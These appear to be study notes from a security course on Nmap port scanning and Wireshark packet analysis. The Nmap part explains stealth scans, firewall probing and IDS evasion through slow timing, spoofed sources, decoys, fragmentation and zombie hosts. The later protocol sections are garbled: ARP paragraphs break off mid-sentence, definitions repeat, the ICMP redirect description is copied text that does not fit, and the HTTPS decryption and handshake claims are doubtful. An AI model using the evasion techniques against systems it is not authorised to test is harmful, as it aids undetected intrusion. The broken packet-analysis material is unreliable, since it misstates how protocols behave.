<p>It is important to note that if you are not a privileged user (root or sudoer), a TCP connect scan is the only possible option to discover open TCP ports.</p>
<p>We notice that port 143 is open, so it replied with a SYN/ACK, and Nmap completed the 3-way handshake by sending an ACK. The figure below shows all the packets exchanged between our Nmap host and the target system’s port 143. The first three packets are the TCP 3-way handshake being completed. Then, the fourth packet tears it down with an RST/ACK packet.</p>
<p>Note that we can use -F to enable fast mode and decrease the number of scanned ports from 1000 to 100 most common ports.</p>
<p>It is worth mentioning that the -r option can also be added to scan the ports in consecutive order instead of random order. This option is useful when testing whether ports open in a consistent manner, for instance, when a target boots up.</p>
<p>Unprivileged users are limited to connect scan. However, the default scan mode is SYN scan, and it requires a privileged (root or sudoer) user to run it. SYN scan does not need to complete the TCP 3-way handshake; instead, it tears down the connection once it receives a response from the server. Because we didn’t establish a TCP connection, this decreases the chances of the scan being logged. We can select this scan type by using the -sS option. The figure below shows how the TCP SYN scan works without completing the TCP 3-way handshake.</p>
<p>UDP is a connectionless protocol, and hence it does not require any handshake for connection establishment. We cannot guarantee that a service listening on a UDP port would respond to our packets. However, if a UDP packet is sent to a closed port, an ICMP port unreachable error (type 3, code 3) is returned. You can select UDP scan using the -sU option; moreover, you can combine it with another TCP scan.</p>
<p>However, as shown in the figure below, we expect to get an ICMP packet of type 3, destination unreachable, and code 3, port unreachable. In other words, the UDP ports that don’t generate any response are the ones that Nmap will state as open.</p>
<p>nmap -sU -F -v 10.10.160.249 # UDP scan with verbose output and scanning the 100 most common ports</p>
<p>You can control the scan timing using -T&lt;0-5&gt;. -T0 is the slowest (paranoid), while -T5 is the fastest. According to Nmap manual page, there are six templates:</p>
<ul>
<li>paranoid (0)</li>
<li>sneaky (1)</li>
<li>polite (2)</li>
<li>normal (3)</li>
<li>aggressive (4)</li>
<li>insane (5)</li>
</ul>
<p>To avoid IDS alerts, you might consider -T0 or -T1. For instance, -T0 scans one port at a time and waits 5 minutes between sending each probe, so you can guess how long scanning one target would take to finish. If you don’t specify any timing, Nmap uses normal -T3. Note that -T5 is the most aggressive in terms of speed; however, this can affect the accuracy of the scan results due to the increased likelihood of packet loss. Note that -T4 is often used during CTFs and when learning to scan on practice targets, whereas -T1 is often used during real engagements where stealth is more important.</p>
<p>Alternatively, you can choose to control the packet rate using --min-rate <number> and --max-rate <number>. For example, --max-rate 10 or --max-rate=10 ensures that your scanner is not sending more than ten packets per second.</p>
<p>Moreover, you can control probing parallelization using --min-parallelism <numprobes> and --max-parallelism <numprobes>. Nmap probes the targets to discover which hosts are live and which ports are open; probing parallelization specifies the number of such probes that can be run in parallel. For instance, --min-parallelism=512 pushes Nmap to maintain at least 512 probes in parallel; these 512 probes are related to host discovery and open ports.</p>

<p>We will cover the following types of port scans:</p>
<ul>
<li>Null Scan</li>
<li>FIN Scan</li>
<li>Xmas Scan</li>
<li>Maimon Scan</li>
<li>ACK Scan</li>
<li>Window Scan</li>
<li>Custom Scan</li>
</ul>
<p>Moreover, we will cover the following:</p>
<ul>
<li>Spoofing IP</li>
<li>Spoofing MAC</li>
<li>Decoy Scan</li>
<li>Fragmented Packets</li>
<li>Idle/Zombie Scan</li>
</ul>
<p>The null scan does not set any flag; all six flag bits are set to zero. You can choose this scan using the -sN option. A TCP packet with no flags set will not trigger any response when it reaches an open port, as shown in the figure below. Therefore, from Nmap’s perspective, a lack of reply in a null scan indicates that either the port is open or a firewall is blocking the packet.</p>
<p>However, we expect the target server to respond with an RST packet if the port is closed. Consequently, we can use the lack of RST response to figure out the ports that are not closed: open or filtered.</p>
<p>FIN Scan
The FIN scan sends a TCP packet with the FIN flag set. You can choose this scan type using the -sF option. Similarly, no response will be sent if the TCP port is open. Again, Nmap cannot be sure if the port is open or if a firewall is blocking the traffic related to this TCP port.</p>
<p>However, the target system should respond with an RST if the port is closed. Consequently, we will be able to know which ports are closed and use this knowledge to infer the ports that are open or filtered. It's worth noting some firewalls will 'silently' drop the traffic without sending an RST.</p>
<p>Xmas Scan
The Xmas scan gets its name after Christmas tree lights. An Xmas scan sets the FIN, PSH, and URG flags simultaneously. You can select Xmas scan with the option -sX.</p>
<p>Like the Null scan and FIN scan, if an RST packet is received, it means that the port is closed. Otherwise, it will be reported as open|filtered.</p>
<p>The following two figures show the case when the TCP port is open and the case when the TCP port is closed.</p>
<p>One scenario where these three scan types can be efficient is when scanning a target behind a stateless (non-stateful) firewall. A stateless firewall will check if the incoming packet has the SYN flag set to detect a connection attempt. Using a flag combination that does not match the SYN packet makes it possible to deceive the firewall and reach the system behind it. However, a stateful firewall will practically block all such crafted packets and render this kind of scan useless.</p>
<p>TCP ACK Scan
Let’s start with the TCP ACK scan. As the name implies, an ACK scan will send a TCP packet with the ACK flag set. Use the -sA option to choose this scan. As we show in the figure below, the target would respond to the ACK with RST regardless of the state of the port. This behaviour happens because a TCP packet with the ACK flag set should be sent only in response to a received TCP packet to acknowledge the receipt of some data, unlike our case. Hence, this scan won’t tell us whether the target port is open in a simple setup.</p>
<p>This kind of scan would be helpful if there is a firewall in front of the target. Consequently, based on which ACK packets resulted in responses, you will learn which ports were not blocked by the firewall. In other words, this type of scan is more suitable to discover firewall rule sets and configuration.</p>
<p>After setting up the target VM 10.10.110.67 with a firewall, we repeated the ACK scan. This time, we received some interesting results. As seen in the console output below, we have three ports that aren't being blocked by the firewall. This result indicates that the firewall is blocking all other ports except for these three ports.</p>
<p>Window Scan
Another similar scan is the TCP window scan. The TCP window scan is almost the same as the ACK scan; however, it examines the TCP Window field of the RST packets returned. On specific systems, this can reveal that the port is open. You can select this scan type with the option -sW. As shown in the figure below, we expect to get an RST packet in reply to our “uninvited” ACK packets, regardless of whether the port is open or closed.</p>
<p>Similarly, launching a TCP window scan against a Linux system with no firewall will not provide much information. As we can see in the console output below, the results of the window scan against a Linux server with no firewall didn’t give any extra information compared to the ACK scan executed earlier.</p>
<p>However, as you would expect, if we repeat our TCP window scan against a server behind a firewall, we expect to get more satisfying results. In the console output shown below, the TCP window scan pointed that three ports are detected as closed. (This is in contrast with the ACK scan that labelled the same three ports as unfiltered.) Although we know that these three ports are not closed, we realize they responded differently, indicating that the firewall does not block them.</p>
<p>Custom</p>
<p>--scanflags URGACKPSHRSTSYNFIN : Customize TCP scan flags</p>
<p>In some network setups, you will be able to scan a target system using a spoofed IP address and even a spoofed MAC address. Such a scan is only beneficial in a situation where you can guarantee to capture the response. If you try to scan a target from some random network using a spoofed IP address, chances are you won’t have any response routed to you, and the scan results could be unreliable.</p>
<p>The following figure shows the attacker launching the command nmap -S SPOOFED_IP MACHINE_IP. Consequently, Nmap will craft all the packets using the provided source IP address SPOOFED_IP. The target machine will respond to the incoming packets sending the replies to the destination IP address SPOOFED_IP. For this scan to work and give accurate results, the attacker needs to monitor the network traffic to analyze the replies.</p>
<p>In brief, scanning with a spoofed IP address is three steps:</p>
<p>Attacker sends a packet with a spoofed source IP address to the target machine.
Target machine replies to the spoofed IP address as the destination.
Attacker captures the replies to figure out open ports.
In general, you expect to specify the network interface using -e and to explicitly disable ping scan -Pn. Therefore, instead of nmap -S SPOOFED_IP MACHINE_IP, you will need to issue nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP to tell Nmap explicitly which network interface to use and not to expect to receive a ping reply. It is worth repeating that this scan will be useless if the attacker system cannot monitor the network for responses.</p>
<p>When you are on the same subnet as the target machine, you would be able to spoof your MAC address as well. You can specify the source MAC address using --spoof-mac SPOOFED_MAC. This address spoofing is only possible if the attacker and the target machine are on the same Ethernet (802.3) network or same WiFi (802.11).</p>
<p>Spoofing only works in a minimal number of cases where certain conditions are met. Therefore, the attacker might resort to using decoys to make it more challenging to be pinpointed. The concept is simple, make the scan appear to be coming from many IP addresses so that the attacker’s IP address would be lost among them. As we see in the figure below, the scan of the target machine will appear to be coming from 3 different sources, and consequently, the replies will go the decoys as well.</p>
<p>You can launch a decoy scan by specifying a specific or random IP address after -D. For example, nmap -D 10.10.0.1,10.10.0.2,ME MACHINE_IP will make the scan of MACHINE_IP appear as coming from the IP addresses 10.10.0.1, 10.10.0.2, and then ME to indicate that your IP address should appear in the third order. Another example command would be nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP, where the third and fourth source IP addresses are assigned randomly, while the fifth source is going to be the attacker’s IP address. In other words, each time you execute the latter command, you would expect two new random IP addresses to be the third and fourth decoy sources.</p>
<p>Fragmented Packets
Nmap provides the option -f to fragment packets. Once chosen, the IP data will be divided into 8 bytes or less. Adding another -f (-f -f or -ff) will split the data into 16 byte-fragments instead of 8. You can change the default value by using the --mtu; however, you should always choose a multiple of 8.</p>
<p>To properly understand fragmentation, we need to look at the IP header in the figure below. It might look complicated at first, but we notice that we know most of its fields. In particular, notice the source address taking 32 bits (4 bytes) on the fourth row, while the destination address is taking another 4 bytes on the fifth row. The data that we will fragment across multiple packets is highlighted in red. To aid in the reassembly on the recipient side, IP uses the identification (ID) and fragment offset, shown on the second row of the figure below.</p>
<p>Let’s compare running sudo nmap -sS -p80 10.20.30.144 and sudo nmap -sS -p80 -f 10.20.30.144. As you know by now, this will use stealth TCP SYN scan on port 80; however, in the second command, we are requesting Nmap to fragment the IP packets.</p>
<p>In the first two lines, we can see an ARP query and response. Nmap issued an ARP query because the target is on the same Ethernet. The second two lines show a TCP SYN ping and a reply. The fifth line is the beginning of the port scan; Nmap sends a TCP SYN packet to port 80. In this case, the IP header is 20 bytes, and the TCP header is 24 bytes. Note that the minimum size of the TCP header is 20 bytes.</p>
<p>With fragmentation requested via -f, the 24 bytes of the TCP header will be divided into multiples of 8 bytes, with the last fragment containing 8 bytes or less of the TCP header. Since 24 is divisible by 8, we got 3 IP fragments; each has 20 bytes of IP header and 8 bytes of TCP header. We can see the three fragments between the fifth and the seventh lines.</p>
<p>Note that if you added -ff (or -f -f), the fragmentation of the data will be multiples of 16. In other words, the 24 bytes of the TCP header, in this case, would be divided over two IP fragments, the first containing 16 bytes and the second containing 8 bytes of the TCP header.</p>
<p>On the other hand, if you prefer to increase the size of your packets to make them look innocuous, you can use the option --data-length NUM, where num specifies the number of bytes you want to append to your packets.</p>
<h3 id="idle-scan"><a class="header" href="#idle-scan">Idle scan</a></h3>
<p>Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.</p>
<p>The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using nmap -sI ZOMBIE_IP MACHINE_IP, where ZOMBIE_IP is the IP address of the idle host (zombie).</p>
<p>The idle (zombie) scan requires the following three steps to discover whether a port is open:</p>
<p>Trigger the idle host to respond so that you can record the current IP ID on the idle host.
Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.
Let’s explain with figures. In the figure below, we have the attacker system probing an idle machine, a multi-function printer. By sending a SYN/ACK, it responds with an RST packet containing its newly incremented IP ID.</p>
<p>The attacker will send a SYN packet to the TCP port they want to check on the target machine in the next step. However, this packet will use the idle host (zombie) IP address as the source. Three scenarios would arise. In the first scenario, shown in the figure below, the TCP port is closed; therefore, the target machine responds to the idle host with an RST packet. The idle host does not respond; hence its IP ID is not incremented.</p>
<p>In the second scenario, as shown below, the TCP port is open, so the target machine responds with a SYN/ACK to the idle host (zombie). The idle host responds to this unexpected packet with an RST packet, thus incrementing its IP ID.</p>
<p>In the third scenario, the target machine does not respond at all due to firewall rules. This lack of response will lead to the same result as with the closed port; the idle host won’t increase the IP ID.</p>
<p>For the final step, the attacker sends another SYN/ACK to the idle host. The idle host responds with an RST packet, incrementing the IP ID by one again. The attacker needs to compare the IP ID of the RST packet received in the first step with the IP ID of the RST packet received in this third step. If the difference is 1, it means the port on the target machine was closed or filtered. However, if the difference is 2, it means that the port on the target was open.</p>
<p>It is worth repeating that this scan is called an idle scan because choosing an idle host is indispensable for the accuracy of the scan. If the “idle host” is busy, all the returned IP IDs would be useless. Moreover, the idle host should be on the same network as the target machine. Finally, the idle host should not be behind a stateful firewall, as this would render the scan useless.</p>
<p>You might consider adding --reason if you want Nmap to provide more details regarding its reasoning and conclusions. Consider the two scans below to the system; however, the latter adds --reason.</p>
<p>Providing the --reason flag gives us the explicit reason why Nmap concluded that the system is up or a particular port is open. In this console output above, we can see that this system is considered online because Nmap “received arp-response.” On the other hand, we know that the SSH port is deemed to be open because Nmap received a “syn-ack” packet back.</p>
<p>For more detailed output, you can consider using -v for verbose output or -vv for even more verbosity.</p>
<p>If -vv does not satisfy your curiosity, you can use -d for debugging details or -dd for even more details. You can guarantee that using -d will create an output that extends beyond a single screen.</p>
<p>This room covered the following types of scans.</p>

<p>Once Nmap discovers open ports, you can probe the available port to detect the running service. Further investigation of open ports is an essential piece of information as the pentester can use it to learn if there are any known vulnerabilities of the service. Join Vulnerabilities 101 to learn more about searching for vulnerable services.</p>
<p>Adding -sV to your Nmap command will collect and determine service and version information for the open ports. You can control the intensity with --version-intensity LEVEL where the level ranges between 0, the lightest, and 9, the most complete. -sV --version-light has an intensity of 2, while -sV --version-all has an intensity of 9.</p>
<p>It is important to note that using -sV will force Nmap to proceed with the TCP 3-way handshake and establish the connection. The connection establishment is necessary because Nmap cannot discover the version without establishing a connection fully and communicating with the listening service. In other words, stealth SYN scan -sS is not possible when -sV option is chosen.</p>
<p>The console output below shows a simple Nmap stealth SYN scan with the -sV option. Adding the -sV option leads to a new column in the output showing the version for each detected service. For instance, in the case of TCP port 22 being open, instead of 22/tcp open ssh, we obtain 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0). Notice that the SSH protocol is guessed as the service because TCP port 22 is open; Nmap didn’t need to connect to port 22 to confirm. However, -sV required connecting to this open port to grab the service banner and any version information it can get, such as nginx 1.6.2. Hence, unlike the service column, the version column is not a guess.</p>
<p>OS Detection
Nmap can detect the Operating System (OS) based on its behaviour and any telltale signs in its responses. OS detection can be enabled using -O; this is an uppercase O as in OS. In this example, we ran nmap -sS -O 10.10.27.43 on the AttackBox. Nmap detected the OS to be Linux 3.X, and then it guessed further that it was running kernel 3.13.</p>
<p>The system that we scanned and attempted to detect its OS version is running kernel version 3.16. Nmap was able to make a close guess in this case. In another case, we scanned a Fedora Linux system with kernel 5.13.14; however, Nmap detected it as Linux 2.6.X. The good news is that Nmap detected the OS correctly; the not-so-good news is that the kernel version was wrong.</p>
<p>The OS detection is very convenient, but many factors might affect its accuracy. First and foremost, Nmap needs to find at least one open and one closed port on the target to make a reliable guess. Furthermore, the guest OS fingerprints might get distorted due to the rising use of virtualization and similar technologies. Therefore, always take the OS version with a grain of salt.</p>
<p>Traceroute
If you want Nmap to find the routers between you and the target, just add --traceroute. In the following example, Nmap appended a traceroute to its scan results. Note that Nmap’s traceroute works slightly different than the traceroute command found on Linux and macOS or tracert found on MS Windows. Standard traceroute starts with a packet of low TTL (Time to Live) and keeps increasing until it reaches the target. Nmap’s traceroute starts with a packet of high TTL and keeps decreasing it.</p>
<p>In the following example, we executed nmap -sS --traceroute 10.10.27.43 on the AttackBox. We can see that there are no routers/hops between the two as they are connected directly.</p>
<p>A script is a piece of code that does not need to be compiled. In other words, it remains in its original human-readable form and does not need to be converted to machine language. Many programs provide additional functionality via scripts; moreover, scripts make it possible to add custom functionality that did not exist via the built-in commands. Similarly, Nmap provides support for scripts using the Lua language. A part of Nmap, Nmap Scripting Engine (NSE) is a Lua interpreter that allows Nmap to execute Nmap scripts written in Lua language. However, we don’t need to learn Lua to make use of Nmap scripts.</p>
<p>Your Nmap default installation can easily contain close to 600 scripts. Take a look at your Nmap installation folder. On the AttackBox, check the files at /usr/share/nmap/scripts, and you will notice that there are hundreds of scripts conveniently named starting with the protocol they target. We listed all the scripts starting with the HTTP on the AttackBox in the console output below; we found around 130 scripts starting with http. With future updates, you can only expect the number of installed scripts to increase.</p>
<p>You can specify to use any or a group of these installed scripts; moreover, you can install other user’s scripts and use them for your scans. Let’s begin with the default scripts. You can choose to run the scripts in the default category using --script=default or simply adding -sC. In addition to default, categories include auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln. A brief description is shown in the following table.</p>
<div class="table-wrapper"><table><thead><tr><th>Script Category</th><th>Description</th></tr></thead><tbody>
<tr><td>auth</td><td>Authentication related scripts</td></tr>
<tr><td>broadcast</td><td>Discover hosts by sending broadcast messages</td></tr>
<tr><td>brute</td><td>Performs brute-force password auditing against logins</td></tr>
<tr><td>default</td><td>Default scripts, same as -sC</td></tr>
<tr><td>discovery</td><td>Retrieve accessible information, such as database tables and DNS names</td></tr>
<tr><td>dos</td><td>Detects servers vulnerable to Denial of Service (DoS)</td></tr>
<tr><td>exploit</td><td>Attempts to exploit various vulnerable services</td></tr>
<tr><td>external</td><td>Checks using a third-party service, such as Geoplugin and Virustotal</td></tr>
<tr><td>fuzzer</td><td>Launch fuzzing attacks</td></tr>
<tr><td>intrusive</td><td>Intrusive scripts such as brute-force attacks and exploitation</td></tr>
<tr><td>malware</td><td>Scans for backdoors</td></tr>
<tr><td>safe</td><td>Safe scripts that won’t crash the target</td></tr>
<tr><td>version</td><td>Retrieve service versions</td></tr>
<tr><td>vuln</td><td>Checks for vulnerabilities or exploit vulnerable services</td></tr>
</tbody></table>
</div>
<p>Some scripts belong to more than one category. Moreover, some scripts launch brute-force attacks against services, while others launch DoS attacks and exploit systems. Hence, it is crucial to be careful when selecting scripts to run if you don’t want to crash services or exploit them.</p>
<p>We use Nmap to run a SYN scan against 10.10.4.80 and execute the default scripts in the console shown below. The command is sudo nmap -sS -sC 10.10.4.80, where -sC will ensure that Nmap will execute the default scripts following the SYN scan. There are new details that appear below. Take a look at the SSH service at port 22; Nmap recovered all four public keys related to the running server. Consider another example, the HTTP service at port 80; Nmap retrieved the default page title. We can see that the page has been left as default.</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds
You can also specify the script by name using --script &quot;SCRIPT-NAME&quot; or a pattern such as --script &quot;ftp*&quot;, which would include ftp-brute. If you are unsure what a script does, you can open the script file with a text reader, such as less, or a text editor. In the case of ftp-brute, it states: “Performs brute force password auditing against FTP servers.” You have to be careful as some scripts are pretty intrusive. Moreover, some scripts might be for a specific server and, if chosen at random, will waste your time with no benefit. As usual, make sure that you are authorized to launch such tests on the target server.</p>
<p>Let’s consider a benign script, http-date, which we guess would retrieve the http server date and time, and this is indeed confirmed in its description: “Gets the date from HTTP-like services. Also, it prints how much the date differs from local time…” On the AttackBox, we execute sudo nmap -sS -n --script &quot;http-date&quot; 10.10.4.80 as shown in the console below.</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
Finally, you might expand the functionality of Nmap beyond the official Nmap scripts; you can write your script or download Nmap scripts from the Internet. Downloading and using a Nmap script from the Internet holds a certain level of risk. So it is a good idea not to run a script from an author you don’t trust.</p>
<p>Whenever you run a Nmap scan, it is only reasonable to save the results in a file. Selecting and adopting a good naming convention for your filenames is also crucial. The number of files can quickly grow and hinder your ability to find a previous scan result. The three main formats are:</p>
<p>Normal
Grepable (grepable)
XML
There is a fourth one that we cannot recommend:</p>
<p>Script Kiddie</p>
<p>Normal
As the name implies, the normal format is similar to the output you get on the screen when scanning a target. You can save your scan in normal format by using -oN FILENAME; N stands for normal. Here is an example of the result.</p>

The grepable format has its name from the command grep; grep stands for Global Regular Expression Printer. In simple terms, it makes filtering the scan output for specific keywords or terms efficient. You can save the scan result in grepable format using -oG FILENAME. The scan output, displayed above in normal format, is shown in the console below using grepable format. The normal output is 21 lines; however, the grepable output is only 4 lines. The main reason is that Nmap wants to make each line meaningful and complete when the user applies grep. As a result, in grepable output, the lines are so long and are not convenient to read compared to normal output.</p>

An example use of grep is grep KEYWORD TEXT_FILE; this command will display all the lines containing the provided keyword. Let’s compare the output of using grep on normal output and grepable output. You will notice that the former does not provide the IP address of the host. Instead, it returned 80/tcp open http nginx 1.6.2, making it very inconvenient if you are sifting through the scan results of multiple systems. However, the latter provides enough information, such as the host’s IP address, in each line to make it complete.

The third format is XML. You can save the scan results in XML format using -oX FILENAME. The XML format would be most convenient to process the output in other programs. Conveniently enough, you can save the scan output in all three formats using -oA FILENAME to combine -oN, -oG, and -oX for normal, grepable, and XML.</p>

<p>ARP Overview</p>
<p>ARP or Address Resolution Protocol is a Layer 2 protocol that is used to connect IP Addresses with MAC Addresses. They will contain REQUEST messages and RESPONSE messages. To identify packets the message header will contain one of two operation codes:</p>
<p>Request (1)
Reply (2)</p>
<p>ARP Request</p>
<p>When a device wants to send a packet to another device on the same network, it will first send an ARP request to find the MAC address of the destination device. The ARP request will contain the IP address of the destination device and the MAC address of the source device.</p>
<p>ARP Reply</p>
<p>When the destination device receives the ARP request, it will send an ARP reply to the source device. The ARP reply will contain the MAC address of the destination device.</p>
<p>ARP Spoofing</p>
<p>ARP spoofing is a type of attack in which an attacker sends fake ARP messages to a network. The goal of the attack is to associate the attacker's MAC address with the IP address of another device on the network. This can be used to intercept traffic between two devices or to perform</p>
<p>ARP Cache</p>
<p>ARP cache is a table that contains the IP address and MAC address of devices on the network. When a device sends an ARP request, it will store the IP address and MAC address of the device in the ARP cache. The ARP cache is used to speed up the process of sending packets to devices on the network.</p>
<p>ARP Table</p>
<p>ARP table is a table that contains the IP address and MAC address of devices on the network. When a device sends an ARP request, it will store the IP address and MAC address of the device in the ARP table. The ARP table is used to speed up the process of sending packets to devices on the network.</p>
<p>ARP Poisoning</p>
<p>ARP poisoning is a type of attack in which an attacker sends fake ARP messages to a network. The goal of the attack is to associate the attacker's MAC address with the IP address of another device on the network. This can be used to intercept traffic between two devices or to perform</p>

<p>ICMP Time Stamp</p>
<p>An ICMP Time Stamp is a message that is sent to a device to request the current time.</p>
<p>ICMP request:</p>
<p>Below we see packet details for a ping request packet. There are a few important things within the packet details that we can take note of first being the type and code of the packet. A type that equals 8 means that it is a request packet, if it is equal to 0 it is a reply packet. When these codes are altered or do not seem correct that is typically a sign of suspicious activity.</p>
<p>There are two other details within the packet that are useful to analyze: timestamp and data. The timestamp can be useful for identifying the time the ping was requested it can also be useful to identify suspicious activity in some cases. We can also look at the data string which will typically just be a random data string.</p>
<p>ICMP reply:</p>
<p>Below we see packet details for a ping reply packet. There are a few important things within the packet details that we can take note of first being the type and code of the packet. A type that equals 8 means that it is a request packet, if it is equal to 0 it is a reply packet. When these codes are altered or do not seem correct that is typically a sign of suspicious activity.</p>
<p>There are two other details within the packet that are useful to analyze: timestamp and data. The timestamp can be useful for identifying the time the ping was requested it can also be useful to identify suspicious activity in some cases. We can also look at the data string which will typically just be a random data string.</p>
<p>ICMP redirect:</p>
<p>Below we see packet details for an ICMP redirect packet. There are a few important things within the packet details that we can take note of first being the type and code of the packet. A type that equals 8 means that it is a request packet, if it is equal to 0 it is a reply packet. When these codes are altered or do not seem correct that is typically a sign of suspicious activity.</p>
<p>ICMP Reply:</p>
<p>Below you can see that the reply packet is very similar to the request packet. One of the main difference that distinguishes a reply packet is the code, in this case, you can see it is 0, confirming that it is a reply packet.</p>
<p>The same analysis techniques for Request packets apply here as well, again the main difference will be the packet type.</p>
<p>TCP Overview</p>
<p>TCP or Transmission Control Protocol handles the delivery of packets including sequencing and errors.</p>
<p>When analyzing TCP packets, Wireshark can be very helpful and color code the packets in order of danger level. If you can't remember the color code go back to Task 3 and refresh on how Wireshark uses colors to match packets.</p>
<p>TCP can give useful insight into a network when analyzing however it can also be hard to analyze due to the number of packets it sends. This is where you may need to use other tools like RSA NetWitness and NetworkMiner to filter out and further analyze the captures.</p>
<p>A common thing that you will see when analyzing TCP packets is known as the TCP handshake, which you should already be familiar with. It includes a series of packets: syn, synack, ack; That allows devices to establish a connection.</p>
<p>TCP SYN</p>
<p>The TCP SYN packet is the first packet in the TCP handshake. It is used to initiate a connection between two devices.</p>
<p>TCP SYN-ACK</p>
<p>The TCP SYN-ACK packet is the second packet in the TCP handshake. It is used to acknowledge the receipt of the TCP SYN packet.</p>
<p>TCP ACK</p>
<p>The TCP ACK packet is the third packet in the TCP handshake. It is used to acknowledge the receipt of the TCP SYN-ACK packet.</p>
<p>TCP RST</p>
<p>The TCP RST packet is used to reset a connection between two devices.</p>
<p>TCP FIN</p>
<p>The TCP FIN packet is used to close a connection between two devices.</p>
<p>TCP PSH</p>
<p>The TCP PSH packet is used to push data to a device.</p>
<p>TCP URG</p>
<p>The TCP URG packet is used to send urgent data to a device.</p>
<p>TCP Window Size</p>
<p>The TCP Window Size is used to control the flow of data between two devices.</p>
<p>TCP Checksum</p>
<p>The TCP Checksum is used to verify the integrity of the TCP header.</p>
<p>TCP Options</p>
<p>The TCP Options are used to control the behavior of the TCP protocol.</p>
<p>TCP Flags</p>
<p>The TCP Flags are used to control the behavior of the TCP protocol.</p>
<p>TCP Sequence Number</p>
<p>The TCP Sequence Number is used to keep track of the order of packets.</p>
<p>TCP Acknowledgment Number</p>
<p>The TCP Acknowledgment Number is used to acknowledge the receipt of packets.</p>
<p>TCP Header Length</p>
<p>The TCP Header Length is used to control the size of the TCP header.</p>
<p>TCP Urgent Pointer</p>
<p>The TCP Urgent Pointer is used to send urgent data to a device.</p>
<p>DNS or Domain Name Service protocol is used to resolves names with IP addresses.</p>
<p>There are a couple of things outlined below that you should keep in the back of your mind when analyzing DNS packets.</p>
<ul>
<li>Query-Response</li>
<li>DNS-Servers Only</li>
<li>UDP</li>
</ul>
<p>If anyone of these is out of place then the packets should be looked at further and should be considered suspicious.</p>
<p>Instantly looking at the packets we can see what they are querying, this can be useful when you have many packets and need to identify suspicious or unusual traffic quickly.</p>
<p>DNS Query</p>
<p>The DNS Query packet is used to request the IP address of a domain name.</p>
<p>Looking at the below query we really have two bits of information that we can use to analyze the packet. The first bit of information we can look at is where the query is originating from, in this case, it is UDP 53 which means that this packet passes that check, if it was TCP 53 then it should be considered suspicious traffic and needs to analyzed further. We can also look at what it is querying as well, this can be useful with other information to build a story of what happened.</p>
<p>DNS Response</p>
<p>The DNS Response packet is used to respond to a DNS Query packet.</p>
<p>Below we see a response packet, it is similar to the query packet, but it includes an answer as well which can be used to verify the query.</p>
<p>DNS Query and Response</p>
<p>The DNS Query and Response packet is used to request the IP address of a domain name and respond to the request.</p>
<p>HTTP or Hypertext Transfer Protocol is a commonly used port for the world wide web and used by some websites, however, its encrypted counterpart: HTTPS is more common which we will discuss in the next text. HTTP is used to send GET and POST requests to a web server in order to receive things like webpages. Knowing how to analyze HTTP can be helpful to quickly spot things like SQLi, Web Shells, and other web-related attack vectors.</p>
<p>HTTP is one of the most straight forward protocols for packet analysis, the protocol is straight to the point and does not include any handshakes or prerequisites before communication.</p>
<p>Above we can see a sample HTTP packet, looking at an HTTP packet we can easily gather information since the data stream is not encrypted like the HTTP counterpart HTTPS. Some of the important information we can gather from the packet is the Request URI, File Data, Server.</p>
<p>Now that we understand the basic structure of an HTTP packet we can move on to looking at a sample HTTP packet capture to get hands-on with the packets.</p>
<p>From this packet we can identify some very important information like the host, user-agent, requested URI, and response.</p>
<p>HTTPS or Hypertext Transfer Protocol Secure is the encrypted counterpart to HTTP. It is used to send GET and POST requests to a web server in order to receive things like webpages. Knowing how to analyze HTTPS can be helpful to quickly spot things like SQLi, Web Shells, and other web-related attack vectors.</p>
<p>HTTPS or Hypertext Transfer Protocol Secure can be one of the most annoying protocols to understand from a packet analysis perspective and can be confusing to understand the steps needed to take in order to analyze HTTPS packets.</p>
<p>The first thing to understand is that HTTPS is encrypted, this means that the data stream is not visible to the naked eye and will need to be decrypted in order to analyze the packets.</p>
<p>The first step to decrypting HTTPS packets is to obtain the private key of the server that you are analyzing. This can be done by asking the server owner for the private key or by using a tool like RSA NetWitness to decrypt the packets.</p>
<p>Once you have the private key you can use RSA NetWitness to decrypt the packets and analyze them.</p>
<p>From this packet we can identify some very important information like the host, user-agent, requested URI, and response.</p>
<p>HTTPS Traffic Overview</p>
<p>Before sending encrypted information the client and server need to agree upon various steps in order to make a secure tunnel.</p>
<ul>
<li>Client and server agree on a protocol version</li>
<li>Client and server select a cryptographic algorithm</li>
<li>The client and server can authenticate to each other; this step is optional</li>
<li>Creates a secure tunnel with a public key</li>
</ul>
<p>We can begin analyzing HTTPS traffic by looking at packets for the handshake between the client and the server. Below is a Client Hello packet showing the SSLv2 Record Layer, Handshake Type, and SSL Version.</p>
<p>Below is the Server Hello packet sending similar information as the Client Hello packet however this time it includes session details and SSL certificate information</p>
<p>Below is the Client Key Exchange packet, this packet is used to send the pre-master secret to the server.</p>
<p>Below is the Client Key Exchange packet, this part of the handshake will determine the public key to use to encrypt further messages between the Client and Server.</p>
<p>In the next packet, the server will confirm the public key and create the secure tunnel, all traffic after this point will be encrypted based on the agreed-upon specifications listed above.</p>

<p>Wireshark only has a few that you will need to be familiar with:</p>
<p>and - operator: and / &amp;&amp;
or - operator: or / ||
equals - operator: eq / ==
not equal - operator: ne / !=
greater than - operator: gt /  &gt;
less than - operator: lt / &lt;</p>
<p>The operators can be used in combination with each other to create complex filters. For example, to filter out all packets that are not from a specific IP address and are not destined for a specific port, you can use the following filter:</p>
<pre><code class="language-bash">ip.addr !=
tcp.port !=
</code></pre>
<p>ip.addr == <IP Address></p>
<p>tcp.port == <Port Number></p>
<p>ip.proto == <Protocol Number></p>
<p>ip.addr == <IP Address> &amp;&amp; tcp.port == <Port Number></p>
<p>ip.addr == <IP Address> &amp;&amp; ip.proto == <Protocol Number></p>
<p>tcp.port == <Port Number> &amp;&amp; ip.proto == <Protocol Number></p>
